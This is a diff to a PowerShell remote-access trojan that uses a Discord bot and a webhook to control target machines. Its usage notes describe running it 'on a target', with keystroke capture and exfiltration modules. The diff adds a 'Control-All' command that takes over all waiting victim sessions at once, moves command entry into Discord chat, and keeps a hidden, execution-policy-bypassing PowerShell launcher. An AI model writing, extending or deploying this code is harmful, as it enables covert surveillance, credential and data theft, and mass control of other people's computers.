@@ -9,7 +9,7 @@ Every 10 seconds it will check for a new message in chat and interpret it as a c
 
 SETUP
 1. make a discord bot at https://discord.com/developers/applications/
-2. add the bot to your discord server
+2. add the bot to your discord server (with intents enabled and messaging and file upload permissions)
 3. create a webhook in the desired channel on your server. ( channel-settings/integrations )
 3. Change $dc below to your webhook URL eg. https://discord.com/api/webhooks/123445623531/f4fw3f4r46r44343t5gxxxxxx
 4. Change $tk below with your bot token
@@ -19,14 +19,13 @@ USAGE
 1. Setup the script
 2. Run the script on a target.
 3. Check discord for 'waiting to connect..' message.
-4. Edit the contents of your hosted file to contain 'options' to get a list of modules
-5. Do the same with any other command listed - To run that module.
+4. Enter the computername to authenticate the session.
+5. Enter commands to interact with the target.
 
 EXTRA
-You can add custom scripting / commands - edit the hoted file to contain your custom powershell script.
-
-Killswitch
-Edit file contents to 'kill' to stop 'KeyCapture' or 'Exfiltrate' command and return to waiting for commands.
+You can add custom scripting / commands - Type 'YOUR CUSTOM POWERSHELL COMMAND' in chat
+Control all waiting sessions simultaneously with 'controll-all' to mass authenticate sessions.
+Killswitch - Type 'kill' in chat to stop 'KeyCapture' or other commands listed in 'extrainfo'..
 #>
 
 # =============================================================================== SETUP VARIABLES ===================================================================================
@@ -89,6 +88,7 @@ Function Options {
 
 - **ExtraInfo**: Get a list of further info and command examples
 - **Kill**: Stop a running module (eg. Keycapture / Exfiltrate)
+- **Control-All**: Control all waiting sessions simultaneously
 - **Pause**: Pause the current authenticated session
 - **Close**: Close this session
 "@
@@ -1034,7 +1034,7 @@ WshShell.Run `"powershell.exe -NonI -NoP -Ep Bypass -W H -C `$tk='$token'; `$ch=
 
 Function Authenticate{
 
-    if ($response -like "$env:COMPUTERNAME") {
+    if (($response -like "$env:COMPUTERNAME") -or ($response -like "Control-All")) {
         Write-Host "Authenticated $env:COMPUTERNAME"
         $script:authenticated = 1
         $script:previouscmd = $response
